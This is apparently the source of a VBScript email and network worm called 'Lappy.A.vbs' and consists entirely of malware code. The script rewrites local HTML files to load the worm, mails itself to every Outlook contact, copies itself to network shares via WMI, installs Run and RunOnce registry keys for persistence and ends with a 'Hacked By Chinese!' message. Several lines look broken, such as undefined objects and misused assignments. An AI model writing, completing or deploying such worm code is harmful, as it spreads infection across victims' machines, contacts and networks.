Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objOutlook = CreateObject("Outlook.Application")
Set objMail = objOutlook.CreateItem(0)
strFilePath = "\\network\share\Lappy.A.vbs"
strEmailSubject = "Check This Out Dude!"

' Check if there are any email addresses in the Outlook contacts
If objOutlook.Session.AddressLists.Count > 0 Then
' Infect HTML files on the victim's computer
Set objHTMLFiles = objFSO.GetFolder(objFSO.GetParentFolderName(WScript.ScriptFullName)).Files
For Each objHTMLFile In objHTMLFiles
If LCase(objFSO.GetExtensionName(objHTMLFile.Name)) = "html" Then
strNewHTMLContent = Replace(objHTMLFile.OpenAsTextStream.ReadAll, "</head>", "<script src=""" & strFilePath & """></script></head>")
Set objNewHTMLFile = objFSO.CreateTextFile(objHTMLFile.Path, True)
objNewHTMLFile.Write strNewHTMLContent
objNewHTMLFile.Close
End If
Next

' Infect MP3, PNG, JPG, and MP4 files on the victim's computer
Set objFolder = objFileSystem.Namespace(objFSO.GetParentFolderName(WScript.ScriptFullName))
Set objItems = objFolder.Items
For Each objItem In objItems
If LCase(objFSO.GetExtensionName(objItem.Name)) = "." & LCase(objFolder.GetDetailsOf(objItem, 29)) Then
objFolder.CopyHere strFilePath & "." & objFSO.GetExtensionName(objItem.Name)
End If
Next

' Send the worm to email contacts
Set objNS = objOutlook.GetNamespace("MAPI")
objNS.Logon "profilename", "password", False, True
Set objContacts = objNS.GetDefaultFolder(10).Items

For Each objContact In objContacts
If objContact.Class = 43 Then
Set objMail.To = objContact.Email1Address
objMail.Body = "Check this Out Dude!"
objMail.Attachments.Add strFilePath, 1, 0, "Lappy.A.vbs"
objMail.Send
End If
Next
End If

' Spread the worm on the network
Set objNetwork = CreateObject("WScript.Network")
strComputerName = objNetwork.ComputerName

Set objWMI = GetObject("winmgmts://" & strComputerName & "/root/cimv2")
Set colItems = objWMI.ExecQuery("SELECT * FROM Win32_Share WHERE Type=0")

For Each objItem In colItems
strRemoteSharePath = "\\" & objItem.Name & "\" & WScript.ScriptFullName
Set objWMI2 = GetObject("winmgmts://" & objItem.Name & "/root/cimv2")
objWMI2.Get("Win32_Process").Create("cmd.exe /c copy """ & strFilePath & """ " & strRemoteSharePath)
Next

' Create a registry key to autostart the worm
strRegistryPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
strRegistryKey = "Lappy.A.vbs"
strRegistryValue = chr(34) & strFilePath & chr(34)

Set objRegistry = CreateObject("WScript.Shell")
objRegistry.RegWrite strRegistryPath & "\" & strRegistryKey, strRegistryValue, "REG_SZ"

' Create a backup registry key for the worm's backup file
strBackupRegistryPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce"
strBackupRegistryKey = "Lappy.A.vbs_backup"

If Not objFSO.FileExists(objFSO.BuildPath(objFSO.GetParentFolderName(WScript.ScriptFullName), "backup_Lappy.A.vbs")) Then
strBackupRegistryValue = chr(34) & objFSO.BuildPath(objFSO.GetParentFolderName(WScript.ScriptFullName), "backup_Lappy.A.vbs") & chr(34)
Else
strBackupRegistryValue = chr(34) & strFilePath & chr(34)
End If

objRegistry.RegWrite strBackupRegistryPath & "\" & strBackupRegistryKey, strBackupRegistryValue, "REG_SZ"
MsgBox "Hacked By Chinese!"
